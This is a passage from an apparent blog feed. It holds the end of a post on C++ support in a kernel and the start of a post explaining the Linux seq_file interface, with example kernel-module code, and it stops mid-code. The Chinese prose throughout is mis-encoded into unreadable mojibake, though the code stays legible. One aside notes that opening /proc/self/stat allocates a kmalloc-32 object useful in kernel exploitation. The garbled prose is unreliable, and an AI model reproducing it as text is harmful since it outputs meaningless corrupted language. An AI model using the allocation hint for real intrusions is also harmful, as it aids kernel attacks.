class="headerlink" title="çº¯è™šå‡½æ•°"></a>çº¯è™šå‡½æ•°</h2><p>è™šå‡½æ•°æ˜¯ C++ çš„ä¸€ä¸ªç‰¹æ€§ï¼Œç®€è€Œè¨€ä¹‹å…¶ä¸­çš„çº¯è™šå‡½æ•°æ˜¯ä¸€ä¸ªç±»ä¼¼å ä½ç¬¦çš„å­˜åœ¨ï¼Œå½“ç¨‹åºè°ƒç”¨çº¯è™šå‡½æ•°æ—¶ç¨‹åºä¼šæŠ¥é”™ï¼Œåœ¨å†…æ ¸ç¯å¢ƒä¸­æˆ‘ä»¬å¹¶æ²¡æœ‰å„ç§åº“å› æ­¤æˆ‘ä»¬éœ€è¦å®ç°ç›¸åº”çš„ error handler</p><p>å¯¹äº GCC è€Œè¨€ï¼Œè¿™ä¸ª error handler åº”å½“ä¸º <code>__cxa_pure_virtual()</code> å‡½æ•°ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦åœ¨æˆ‘ä»¬çš„å†…æ ¸ä¸­å®ç°è¯¥å‡½æ•°å³å¯ï¼Œ <em>ç›®å‰æˆ‘ä»¬æš‚ä¸”ç•™ç©º</em> ï¼Œåœ¨åç»­å®Œæˆå†…æ ¸è¾“å‡ºåŠŸèƒ½åå†æ·»åŠ ä¸Šç±»ä¼¼ <code>printk()</code> çš„æŠ¥é”™ä¿¡æ¯è¾“å‡ºï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-type">void</span> __cxa_pure_virtual()<br>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * <span class="hljs-doctag">TODO:</span> add error message output</span><br><span class="hljs-comment">    */</span><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0xFF-Reference"><a href="#0xFF-Reference" class="headerlink" title="0xFF. Reference"></a>0xFF. Reference</h1><p><a href="https://arttnba3.cn/2022/06/30/OS-0X03-LINUX-KERNEL-MEMORY-5.11-PART-II/">ã€OS.0x03ã€‘Linuxå†…æ ¸å†…å­˜ç®¡ç†II - Buddy System</a></p><p><a href="https://arttnba3.cn/2023/02/24/OS-0X04-LINUX-KERNEL-MEMORY-6.2-PART-III/">ã€OS.0x04ã€‘Linux å†…æ ¸å†…å­˜ç®¡ç†æµ…æ III - Slub Allocator</a></p><p><a href="https://blogs.oracle.com/linux/post/linux-slub-allocator-internals-and-debugging-1">Linux SLUB Allocator Internals and Debugging, Part 1 of 4</a></p><p><a href="https://wiki.osdev.org/C++">C++ - OS Dev</a></p><p><a href="https://wiki.osdev.org/Calling_Global_Constructors">Calling Global Constructors - OS Dev</a></p><p><a href="https://itanium-cxx-abi.github.io/cxx-abi/abi.html">Itanium C++ ABI</a></p><p> <a href="https://refspecs.linuxfoundation.org/elf/elf.pdf">Linux Foundation - Executable and Linking Format (ELF) Specification</a> </p><p><a href="https://www.amd.com/content/dam/amd/en/documents/processor-tech-docs/programmer-references/24593.pdf">AMD64 Architecture Programmerâ€™s Manual Volume 2</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Good old MEMORIES has goneâ€¦&lt;/p&gt;</summary>
    
    
    
    <category term="CODE" scheme="https://arttnba3.github.io/categories/CODE/"/>
    
    
    <category term="å¼€å‘æ‰‹è®°" scheme="https://arttnba3.github.io/tags/%E5%BC%80%E5%8F%91%E6%89%8B%E8%AE%B0/"/>
    
    <category term="æ“ä½œç³»ç»Ÿ" scheme="https://arttnba3.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="å†…å­˜ç®¡ç†" scheme="https://arttnba3.github.io/tags/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    
    <category term="C++" scheme="https://arttnba3.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>ã€OS.0x05ã€‘Linux å†…æ ¸æ–‡ä»¶ç³»ç»Ÿ - åˆæ¢åºåˆ—æ–‡ä»¶æ¥å£</title>
    <link href="https://arttnba3.github.io/2024/05/31/OS-0X05-LINUX-KERNEL-FILESYSTEM-SEQFILE/"/>
    <id>https://arttnba3.github.io/2024/05/31/OS-0X05-LINUX-KERNEL-FILESYSTEM-SEQFILE/</id>
    <published>2024-05-30T21:36:25.000Z</published>
    <updated>2024-08-19T06:25:57.624Z</updated>
    
    <content type="html"><![CDATA[<p>çœŸæ˜¯åºåºåˆåˆ—åˆ—å•Šï¼Œä½ ä»¬æœ‰æ²¡æœ‰è¿™æ ·çš„æ–‡ä»¶æ¥å£å•Šæˆ‘æƒ³é—®</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>ç¬”è€…å¤§äºŒä¸Šé‚£ä¼šå­¦ kernel pwn æ—¶ä¾¿ç»å¸¸åœ¨ç”¨æˆ·æ€ç”¨åˆ°åºåˆ—æ–‡ä»¶æ¥å£ï¼Œä¸è¿‡åœ¨é‚£ä¸ªæ—¶å€™ç¬”è€…åªå…³å¿ƒæ‰“å¼€ <code>/proc/self/stat</code> æ–‡ä»¶ä¾¿èƒ½åˆ†é…ä¸€ä¸ª <code>kmalloc-32</code> å¯¹è±¡ï¼ˆ<code>seq_operations</code> ï¼‰ï¼›å¤§äºŒä¸‹å†™ Linux kernel rootkit æ—¶åˆç¢°åˆ° <code>/proc/kallsyms</code> æ— æ³•åœ¨å†…æ ¸å±‚è¯»å–çš„é—®é¢˜ï¼Œä¸è¿‡ä¹Ÿæ˜¯äº†è§£äº†ä¸€ä¸‹åºåˆ—æ–‡ä»¶æ¥å£çš„ç›¸å…³çŸ¥è¯†å°±æ²¡æœ‰å†ç»§ç»­æ·±å…¥äº†ï¼ˆ<del>ä¸è¿‡è¿™ä¸ªä¸œè¥¿æœ¬æ¥å°±å¾ˆç®€çº¦ï¼Œå°±å…¶æœ¬èº«è€Œè¨€ç¡®å®æ²¡æœ‰ä»€ä¹ˆèƒ½å¤Ÿæ·±å…¥çš„åœ°æ–¹</del>ï¼‰</p><p>åˆšå¥½ç¬”è€…æœ€è¿‘çš„å·¥ä½œåˆæ¥è§¦åˆ°äº†è¿™ä¸ªç©æ„ï¼Œæ‰€ä»¥ç®€å•å†™ä¸€ç¯‡åšå®¢è®°å½•ä¸€ä¸‹è¿™æ˜¯ä¸ªä»€ä¹ˆç©æ„ï¼šï¼‰</p><h1 id="0x01-åºåˆ—æ–‡ä»¶æ¥å£-ç®€ä»‹"><a href="#0x01-åºåˆ—æ–‡ä»¶æ¥å£-ç®€ä»‹" class="headerlink" title="0x01. åºåˆ—æ–‡ä»¶æ¥å£ - ç®€ä»‹"></a>0x01. åºåˆ—æ–‡ä»¶æ¥å£ - ç®€ä»‹</h1><p><a href="https://docs.kernel.org/filesystems/seq_file.html">åºåˆ—æ–‡ä»¶æ¥å£</a> æ˜¯åœ¨ç°æœ‰ VFS ä¸Šå»ºç«‹çš„ä¸€å¥—ç”¨äº <strong>ä»å†…æ ¸ç©ºé—´å‘ç”¨æˆ·ç©ºé—´æä¾›ä¼ è¾“åºåˆ—æ•°æ®</strong> çš„æ¥å£ï¼Œè¿™é‡Œæˆ‘ä»¬å°†åºåˆ—æ•°æ®ç®€å•å®šä¹‰ä¸º <strong>ç”±å¤šæ¡æ•°æ®ç»„æˆçš„æ•°æ®</strong> ï¼ˆä¾‹å¦‚ <code>/proc/kallsyms</code> ä¸ºç”¨æˆ·æä¾›äº†å¤šæ¡å†…æ ¸ç¬¦å·ä¿¡æ¯æ•°æ®ï¼‰ï¼Œè¿™ä¸ªåœºæ™¯ä¸‹å†…æ ¸é€šå¸¸éœ€è¦å¤šæ¬¡è¿­ä»£åœ°å‘ç”¨æˆ·ç©ºé—´æ‹·è´å¤šæ¡æ•°æ®</p><p>åºåˆ—æ–‡ä»¶æ¥å£çš„è®¾è®¡ä¸»è¦å‡ºäºä¸€ä¸ªåŸå› ï¼š<strong>ã€å¤§äºä¸€é¡µçš„æ–‡ä»¶æ“ä½œå¯¹äºå¼€å‘è€…è€Œè¨€éå¸¸éº»çƒ¦ã€‘</strong> ï¼Œæˆ‘ä»¬è¦ä»å†…æ ¸ç©ºé—´å‘ç”¨æˆ·ç©ºé—´ä¼ é€’æ•°æ®é€šå¸¸éœ€è¦è‡ªè¡Œåˆ›å»ºå¦‚ <code>procfs</code> ç­‰èŠ‚ç‚¹å¹¶è‡ªå®šä¹‰ä¸€ä»½ <code>file_operations</code> ï¼Œå¼€å‘è€…èƒ½ç”¨çš„åªæœ‰ä¸€ä¸ªè£¸çš„ <code>read(struct file *, char __user *, size_t, loff_t *)</code> ï¼Œè€Œå¯¹äºè¿™ç±»åŠŸèƒ½æ¯”è¾ƒå•ä¸€çš„åœºæ™¯ï¼Œ <em>è®¾è®¡ä¸Šè¦è€ƒè™‘çš„å’Œå¸¸è§„çš„æ–‡ä»¶æ¥å£ç›¸æ¯”å´ä¸€ä¸ªéƒ½ä¸èƒ½å°‘</em> ï¼ˆè·¨é¡µå¤šæ¡æ•°æ®æ‹·è´çš„æ–‡ä»¶åç§»å¤„ç†ç¡®å®ä¸æ˜¯ä¸ªå°é—®é¢˜ï¼‰ï¼Œè¿™å¢å¤§äº†å¼€å‘è€…çš„å¼€å‘éš¾åº¦ï¼Œä½†åºåˆ—æ•°æ®çš„ä¼ è¾“åœ¨å†…æ ¸å¼€å‘ä¸­å…¶å®åˆæ˜¯ä¸€ä¸ªéå¸¸å¸¸è§çš„åœºæ™¯</p><p>ç”±æ­¤ï¼Œé’ˆå¯¹æ­¤ç±»åœºæ™¯ï¼Œåºåˆ—æ–‡ä»¶æ¥å£åº”è¿è€Œç”Ÿï¼Œ<strong>ä¸ºä¸Šå±‚å¼€å‘è€…æä¾›äº†ç±»ä¼¼ã€è¿­ä»£å™¨ã€‘çš„ç®€æ˜“æ–‡ä»¶è¯»å–æ¥å£</strong> ï¼Œç”±æ­¤æå¤§åœ°ç®€åŒ–äº†å¯¹äºæ­¤ç±»åœºæ™¯çš„å†…æ ¸å¼€å‘å·¥ä½œ</p><blockquote><p>æœ¬ç¯‡åšå®¢ä½¿ç”¨çš„å†…æ ¸æºç ä¸º 6.9.1</p></blockquote><h2 id="åºåˆ—æ–‡ä»¶æ¥å£å¼€å‘ï¼šæ“ä½œå‡½æ•°"><a href="#åºåˆ—æ–‡ä»¶æ¥å£å¼€å‘ï¼šæ“ä½œå‡½æ•°" class="headerlink" title="åºåˆ—æ–‡ä»¶æ¥å£å¼€å‘ï¼šæ“ä½œå‡½æ•°"></a>åºåˆ—æ–‡ä»¶æ¥å£å¼€å‘ï¼šæ“ä½œå‡½æ•°</h2><p>è¦ä½¿ç”¨åºåˆ—æ–‡ä»¶æ¥å£ï¼Œæˆ‘ä»¬éœ€è¦å®ç°ä¸€ä¸ª <code>seq_operations</code> å‡½æ•°è¡¨ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/seq_file.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> &#123;</span><br><span class="hljs-type">void</span> * (*start) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">loff_t</span> *pos);<br><span class="hljs-type">void</span> (*stop) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v);<br><span class="hljs-type">void</span> * (*next) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v, <span class="hljs-type">loff_t</span> *pos);<br><span class="hljs-type">int</span> (*show) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v);<br>&#125;;<br></code></pre></td></tr></table></figure><p>å„å‡½æ•°æŒ‡é’ˆè¯´æ˜å¦‚ä¸‹ï¼ˆ<strong>æŒ‰ç…§è¢«è°ƒç”¨é¡ºåº</strong>ï¼‰ï¼š</p><ul><li><code>start</code> ï¼šåœ¨å¼€å§‹è¯»å–åºåˆ—æ•°æ®å‰è¿›è¡Œåˆå§‹åŒ–å·¥ä½œï¼Œå¹¶è¿”å›æŒ‡å®šåç§»ä¸Šçš„åºåˆ—æ•°æ®å¯¹è±¡</li><li><code>show</code> ï¼šæ‰“å°ä¼ å…¥çš„åºåˆ—æ•°æ®å¯¹è±¡ï¼Œè¯¥å‡½æ•°ä¼šè¢«å¾ªç¯è°ƒç”¨</li><li><code>next</code> ï¼š æ ¹æ®ä¼ å…¥çš„åç§»å€¼ä¸å½“å‰å¯¹è±¡è·å–ä¸‹ä¸€ä¸ªåºåˆ—æ•°æ®å¯¹è±¡ï¼Œå¹¶è‡ªå¢åç§»å€¼ï¼Œè¯¥å‡½æ•°ä¼šè¢«å¾ªç¯è°ƒç”¨</li><li><code>stop</code> ï¼šåœ¨å®Œæˆå¯¹åºåˆ—æ–‡ä»¶çš„éå†åç”¨ä»¥è¿›è¡Œéœ€è¦çš„æ”¶å°¾å·¥ä½œï¼Œå¯ä»¥ä¸ºç©ºå‡½æ•°</li></ul><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œæ‰€è¯´çš„åç§»å€¼é€šå¸¸æŒ‡çš„ <strong>å…¶å®æ˜¯åºåˆ—æ•°æ®å¯¹è±¡çš„ç´¢å¼•å€¼</strong> ï¼Œè€ŒéåŸºäºå…·ä½“å†…å­˜å¯¹è±¡å¤§å°è®¡ç®—çš„å€¼</p><p>é™¤äº† <code>seq_operations</code> å‡½æ•°è¡¨ä»¥å¤–ï¼Œåºåˆ—æ–‡ä»¶æ¥å£å¯¹äºæ¯ä¸ªæ–‡ä»¶è¿˜ä¼šé¢å¤–åˆ†é…ä¸€ä¸ª <code>seq_file</code> ç»“æ„ä½“ï¼ˆåœ¨ open() æ—¶åˆ†é…åˆ° <code>file-&gt;private</code> ï¼‰ç”¨ä»¥å­˜å‚¨å¦‚å½“å‰çš„è¯»å–åç§»ã€æ•´ä¸ªåºåˆ—çš„é•¿åº¦ç­‰æ•°æ®ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> &#123;</span><br><span class="hljs-type">char</span> *buf;<br><span class="hljs-type">size_t</span> size;<br><span class="hljs-type">size_t</span> from;<br><span class="hljs-type">size_t</span> count;<br><span class="hljs-type">size_t</span> pad_until;<br><span class="hljs-type">loff_t</span> index;<br><span class="hljs-type">loff_t</span> read_pos;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">lock</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> *<span class="hljs-title">op</span>;</span><br><span class="hljs-type">int</span> poll_event;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span>;</span><br><span class="hljs-type">void</span> *private;<br>&#125;;<br></code></pre></td></tr></table></figure><p>æ ¸å¿ƒçš„å­—æ®µè¯´æ˜å¦‚ä¸‹ï¼š</p><ul><li><code>buf</code> ï¼šä¸´æ—¶å­˜æ”¾ç”± <code>show()</code> æ‰“å°çš„æ•°æ®ï¼Œé€šå¸¸ä¸ºå•å¼ å†…å­˜é¡µå¤§å°ï¼Œæ•°æ®ä¼šå…ˆè¢«æ‹·è´åˆ°è¿™å—å†…å­˜ä¸Šå†æ‹·è´å›ç”¨æˆ·ç©ºé—´</li><li><code>size</code> ï¼š<code>buf</code> çš„æ€»å¤§å°</li><li><code>from</code>ï¼š<code>buf</code> å½“å‰æ•°æ®å†™å…¥çš„èµ·å§‹åç§»</li><li><code>count</code> ï¼š<code>buf</code> å·²ç»å†™å…¥çš„å¤§å°ï¼Œ<strong>åºåˆ—æ–‡ä»¶ä¸Šçš„æœ‰æ•ˆå¾…å†™å…¥æ•°æ®ä¸º</strong> <code>&amp;seq_file::buf[seq_file::from]</code> <strong>èµ·å§‹çš„é•¿åº¦ä¸º</strong> <code>seq_file::count</code> <strong>çš„åŒºåŸŸ</strong> ï¼Œé€šå¸¸æ¯ä¸€è½®è¯»å–éƒ½ä¼šåˆ·æ–°ä¸€æ¬¡ <code>count</code> å­—æ®µ</li><li><code>index</code> ï¼š å½“å‰æ­£åœ¨è¯»å–çš„å¯¹è±¡çš„åç§»å€¼</li><li><code>read_pos</code> ï¼šæˆåŠŸè¯»å–çš„æ•°æ®é‡ï¼ˆå­—èŠ‚ï¼‰</li><li><code>op</code> ï¼šåºåˆ—æ–‡ä»¶æ¥å£çš„å‡½æ•°è¡¨ <del>å…¶å®æ˜¯æŒ‡ç©åŸç¥çš„äºº</del> </li><li><code>file</code> ï¼šå¯¹åº”çš„ VFS file èŠ‚ç‚¹</li><li><code>private</code> ï¼šä¾›ä¸Šå±‚å¼€å‘è€…å­˜æ”¾ç§äººæ•°æ®</li></ul><p>ä¸‹é¢æˆ‘ä»¬ä»¥ä¸€ä¸ªåŸºç¡€çš„é“¾è¡¨ç»“æ„ä½œä¸ºç¤ºä¾‹è¯´æ˜å¦‚ä½•åŸºäºåºåˆ—æ–‡ä»¶æ¥å£è¿›è¡ŒåŸºæœ¬çš„å¼€å‘ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">list</span>;</span><br>    <span class="hljs-type">char</span> data[<span class="hljs-number">0x100</span>];<br>&#125;;<br><br>LIST_HEAD(a3_seq_list);<br></code></pre></td></tr></table></figure><h3 id="start-ï¼šåºåˆ—æ–‡ä»¶è¯»å–åˆå§‹åŒ–"><a href="#start-ï¼šåºåˆ—æ–‡ä»¶è¯»å–åˆå§‹åŒ–" class="headerlink" title="start()ï¼šåºåˆ—æ–‡ä»¶è¯»å–åˆå§‹åŒ–"></a>start()ï¼šåºåˆ—æ–‡ä»¶è¯»å–åˆå§‹åŒ–</h3><p>å†…æ ¸å°†å•æ¬¡ <code>read()</code> ç³»ç»Ÿè°ƒç”¨è¯»å–çš„è¿‡ç¨‹ç§°ä¹‹ä¸ºä¸€ä¸ª <code>session</code> ï¼Œåœ¨æ¯ä¸ª session å¼€å§‹æ—¶éƒ½ä¼šè°ƒç”¨åºåˆ—æ–‡ä»¶æ¥å£çš„ <code>start()</code> å‡½æ•°ä»¥è¿›è¡Œåˆå§‹åŒ–ï¼Œæ ¸å¿ƒä½œç”¨æ˜¯ <strong>åœ¨è¯»å–å¼€å§‹æ—¶è·å–æŒ‡å®šåç§»å€¼ä¸Šçš„å¯¹è±¡ä½œä¸ºèµ·å§‹ç‚¹</strong> ï¼Œæˆ‘ä»¬é€šå¸¸éœ€è¦è¿”å›<strong>æŒ‡å®šåç§»ä¸Šçš„åºåˆ—æ•°æ®å¯¹è±¡</strong></p><p>åœ¨ç°ä»£å†…æ ¸åŠé©±åŠ¨å¼€å‘åœºæ™¯ä¸­ <code>start()</code> æ‰€è·å–åˆ°çš„é€šå¸¸æ˜¯ç¬¬ä¸€ä¸ªåºåˆ—æ•°æ®å¯¹è±¡ï¼Œè¿™ä¹Ÿæ˜¯åºåˆ—æ–‡ä»¶æ¥å£çš„è§„èŒƒç”¨æ³•ï¼Œ <em>å› ä¸ºå¤§éƒ¨åˆ†æƒ…å†µä¸‹å¼€å‘è€…å¹¶ä¸éœ€è¦å¤„ç†åç§»å€¼ä¸ä¸º 0 çš„åœºæ™¯</em> ï¼Œå› æ­¤ä¹Ÿå¯ä»¥ç®€å•è¿”å›ä¸€ä¸ª  <code>SEQ_START_TOKEN</code>  ï¼ˆå€¼ä¸º 1ï¼‰</p><blockquote><p>è¯¥å€¼ç”¨äºåœ¨ <code>next()</code> ä¸ <code>show()</code> ä¸­<strong>ä¾›ä½ è‡ªå·±è¿›è¡Œè¯†åˆ«</strong>ï¼Œæ‰€ä»¥åªè¦ä½ è®¤å¾—å°±è¡Œ</p></blockquote><p>å¯¹äºè¯»å–åˆ°æœ«å°¾çš„æƒ…å†µï¼ˆåç§»å€¼è¶…å‡ºèŒƒå›´ï¼‰ï¼Œ <strong>é€šå¸¸ç›´æ¥è¿”å› NULL å³å¯</strong> ï¼Œå¯¹äºåˆå§‹åŒ–å¤±è´¥çš„åœºæ™¯ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥è¿”å›ä¸€ä¸ª <code>ERR_PTR</code> ç±»å‹å€¼è¿›è¡Œè¯´æ˜</p><p>ä»¥ä¸‹æ˜¯æˆ‘ä»¬çš„ç¤ºä¾‹ä»£ç ï¼Œè¿™é‡Œæˆ‘ä»¬ç®€å•åœ°è¿”å›é“¾è¡¨ä¸ŠæŒ‡å®šåç§»çš„å¯¹è±¡ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span>* <span class="hljs-title function_">a3kmod_seq_start</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">loff_t</span> *ppos)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> *<span class="hljs-title">ptr</span>;</span><br>    <span class="hljs-type">loff_t</span> cpos = <span class="hljs-number">0</span>;<br><br>    list_for_each_entry(ptr, &amp;a3_seq_list, <span class="hljs-built_in">list</span>) &#123;<br>        <span class="hljs-keyword">if</span> (cpos == (*ppos)) &#123;<br>            <span class="hljs-keyword">return</span> ptr;<br>        &#125;<br><br>        cpos++;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="show-ï¼šæ‰“å°æŒ‡å®šçš„åºåˆ—æ•°æ®"><a href="#show-ï¼šæ‰“å°æŒ‡å®šçš„åºåˆ—æ•°æ®" class="headerlink" title="show()ï¼šæ‰“å°æŒ‡å®šçš„åºåˆ—æ•°æ®"></a>show()ï¼šæ‰“å°æŒ‡å®šçš„åºåˆ—æ•°æ®</h3><p><code>show()</code> å‡½æ•°ç”¨äºå°†å½“å‰åºåˆ—å¯¹è±¡éœ€è¦è¢«å¯¼å‡ºçš„æ•°æ®é€šè¿‡åºåˆ—æ–‡ä»¶çš„æ‰“å°æ¥å£æ‹·è´åˆ°æŒ‡å®šçš„ä¸´æ—¶å†…å­˜ï¼ˆå³ <code>seq_file::buf</code> ï¼‰ä¸Šï¼Œè¿™äº›æ•°æ®ä¼šåœ¨å¤šæ¬¡éå†å®Œæˆåï¼ˆbuf æ»¡äº†æˆ–è€…åºåˆ—éå†å®Œæˆï¼‰ç»Ÿä¸€æ‹·è´åˆ°ç”¨æˆ·ç©ºé—´ï¼Œå¯ç”¨çš„æ¥å£é€šå¸¸æœ‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* print data directly */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">seq_printf</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *fmt, ...)</span>; <span class="hljs-comment">/* mostly used */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">seq_putc</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">char</span> c)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">seq_puts</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *s)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">seq_escape</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *s, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *esc)</span>;<br><span class="hljs-comment">/* print file path */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">seq_path</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> path *path,</span><br><span class="hljs-params">             <span class="hljs-type">const</span> <span class="hljs-type">char</span> *esc)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">seq_path_root</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> path *path,</span><br><span class="hljs-params">                  <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> path *root, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *esc)</span><br></code></pre></td></tr></table></figure><p>æ­£å¸¸æ‰“å°å®Œæˆéœ€è¦è¿”å› 0ï¼Œè¿”å›å°äº 0 çš„å€¼è¡¨ç¤ºå‡ºé”™ï¼Œè¿”å›å¤§äº 0 çš„å€¼ï¼ˆ <code>SEQ_SKIP</code> ï¼‰è¡¨ç¤ºè·³è¿‡è¯¥é¡¹ï¼Œä»¥ä¸‹æ˜¯æˆ‘ä»¬çš„ç¤ºä¾‹ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3kmod_seq_show</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> *<span class="hljs-title">data</span> =</span> v;<br><br>    seq_printf(m, <span class="hljs-string">&quot;[a3kmod_data] data: %s\n&quot;</span>, data-&gt;data);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="next-ï¼šè·å–æŒ‡å®šåç§»ä¸Šçš„åºåˆ—æ•°æ®ï¼Œè‡ªå¢åç§»å€¼"><a href="#next-ï¼šè·å–æŒ‡å®šåç§»ä¸Šçš„åºåˆ—æ•°æ®ï¼Œè‡ªå¢åç§»å€¼" class="headerlink" title="next()ï¼šè·å–æŒ‡å®šåç§»ä¸Šçš„åºåˆ—æ•°æ®ï¼Œè‡ªå¢åç§»å€¼"></a>next()ï¼šè·å–æŒ‡å®šåç§»ä¸Šçš„åºåˆ—æ•°æ®ï¼Œè‡ªå¢åç§»å€¼</h3><p><code>next()</code> å‡½æ•°ç”¨ä»¥ <strong>æ ¹æ®ä¼ å…¥çš„åç§»å€¼è·å–ä¸‹ä¸€ä¸ªåºåˆ—æ•°æ®å¯¹è±¡ï¼Œå¹¶æ›´æ–°åç§»å€¼</strong> ï¼Œåœ¨å•æ¬¡ session ä¸­ä¼šè¿­ä»£åœ°è°ƒç”¨ <code>next()</code> å‡½æ•°ï¼Œç›´åˆ°å½“å‰æ•°æ®é¡µæ— æ³•ç»§ç»­è£…è½½ï¼Œæˆ–æ˜¯å·²ç»è¯»å–å®Œåºåˆ—ä¸Šæ‰€æœ‰çš„æ•°æ®</p><p>åœ¨ <code>next()</code> å‡½æ•°å½“ä¸­ï¼Œæˆ‘ä»¬éœ€è¦æ›´æ–°ä¸Šå±‚çš„ index ï¼ˆé€šå¸¸ç›´æ¥ <code>+1</code> å³å¯ï¼‰ï¼Œå¹¶è¿”å›ä¸‹ä¸€ä¸ªåºåˆ—æ•°æ®å¯¹è±¡ï¼Œä»¥ä¸‹æ˜¯æˆ‘ä»¬çš„ç¤ºä¾‹ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 